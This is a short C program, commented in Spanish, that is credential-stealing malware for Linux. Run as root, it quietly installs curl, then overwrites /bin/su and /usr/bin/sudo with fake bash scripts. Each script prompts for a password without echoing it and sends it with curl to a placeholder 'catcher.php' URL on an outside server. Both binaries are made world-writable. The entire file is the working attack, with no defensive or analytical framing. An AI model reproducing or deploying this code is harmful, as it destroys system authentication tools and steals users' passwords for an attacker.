#include <stdio.h>
#include <string.h>

int main () {

 /** COMPROBAMOS SI SOMOS EJECUTADOS COMO ROOT **/

   if(geteuid() != 0) {

      printf("Err.: This script must be run as root.\n");
      return 0;
  
   }


   char command[250];

   /** INSTALAMOS CURL, VARIOS DEPENDIENDO DEL SISTEMA, OCULTAMOS LA SALIDA CON /DEV/NULL **/

   strcpy(command, "apt install curl > /dev/null 2>&1" );
   system(command);

   strcpy(command, "apt-get install curl > /dev/null 2>&1" );
   system(command);

   strcpy(command, "yum install curl > /dev/null 2>&1" );
   system(command);

   strcpy(command, "aptitude install curl > /dev/null 2>&1" );
   system(command);

   /** EMPEZAMOS A GUARDAR EN /BIN/SU EL CONTENIDO **/

   strcpy(command, "echo '#!/bin/bash' > /bin/su" );
   system(command);

   strcpy(command, "echo 'stty -echo' >> /bin/su" );
   system(command);

   strcpy(command, "echo 'printf \"Password: \" ' >> /bin/su" );
   system(command);

   strcpy(command, "echo 'read PASSWORD' >> /bin/su" );
   system(command);

   strcpy(command, "echo 'stty echo' >> /bin/su" );
   system(command);

   strcpy(command, "echo 'echo ' >> /bin/su" );
   system(command);

   strcpy(command, "echo 'curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" > /dev/null 2>&1' >> /bin/su" );
   system(command);

   /** LE DAMOS PERMISOS **/

   strcpy(command, "chmod 777 /bin/su" );
   system(command);


   /** EMPEZAMOS A GUARDAR EN /USR/BIN/SUDO EL CONTENIDO **/

   strcpy(command, "echo '#!/bin/bash' > /usr/bin/sudo" );
   system(command);

   strcpy(command, "echo 'stty -echo' >> /usr/bin/sudo" );
   system(command);

   strcpy(command, "echo 'printf \"Password: \" ' >> /usr/bin/sudo" );
   system(command);

   strcpy(command, "echo 'read PASSWORD' >> /usr/bin/sudo" );
   system(command);

   strcpy(command, "echo 'stty echo' >> /usr/bin/sudo" );
   system(command);

   strcpy(command, "echo 'echo ' >> /usr/bin/sudo" );
   system(command);

   strcpy(command, "echo 'curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" > /dev/null 2>&1' >> /usr/bin/sudo" );
   system(command);

   /** LE DAMOS PERMISOS **/

   strcpy(command, "chmod 777 /usr/bin/sudo" );
   system(command);


   return(0);
} 


